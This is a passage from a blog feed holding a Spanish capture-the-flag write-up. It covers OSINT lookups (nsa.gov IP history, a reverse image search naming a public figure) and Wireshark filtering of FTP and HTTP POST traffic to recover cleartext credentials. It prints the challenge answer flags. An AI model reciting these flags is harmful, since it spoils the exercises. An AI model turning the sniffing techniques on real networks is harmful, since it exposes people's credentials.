+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/forense_computer_nsa.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag:VICTIM-PC&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;osint&#34;&gt;OSINT&lt;/h1&gt;
+&lt;h2 id=&#34;ip-nsa&#34;&gt;IP NSA&lt;/h2&gt;
+&lt;p&gt;Utilizamos algunas paginas para obtener informacion del historial de IPs de nsa.gov.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://myip.ms/&#34;&gt;https://myip.ms/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Nuestra flag: &lt;code&gt;flag{23.196.119.211}&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;196&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;119&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;211&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;United&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;States&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Akamai&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Technologies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Inc&lt;/span&gt;.  &lt;span class=&#34;m&#34;&gt;2016-08-25&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;sexy&#34;&gt;SEXY&lt;/h2&gt;
+&lt;p&gt;Utilizamos Google Images para hacer una busqueda de la imagen e informacion.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/sexy.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/sexy2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag: tiffanytrump&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;stux&#34;&gt;STUX&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/stux.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag: 1096100&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;networking&#34;&gt;Networking&lt;/h1&gt;
+&lt;h2 id=&#34;networking1&#34;&gt;NETWORKING1&lt;/h2&gt;
+&lt;p&gt;Utilizamos Wireshark y un filtro para el puerto 21 FTP.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;tcp.port==21&lt;/li&gt;
+&lt;li&gt;ftp&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/networking1.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{sn1ff1ng_ftp_cr3dent1als}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;networking2&#34;&gt;NETWORKING2&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;http.request.method == &amp;ldquo;POST&amp;rdquo;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/networking2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{http_1nsecure_commun1cat1on}&lt;/code&gt;&lt;/p&gt;
+</content:encoded>
         <dc:creator>sckull</dc:creator>
         <media:content url="https://sckull.github.io/images/posts/owasp/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
         
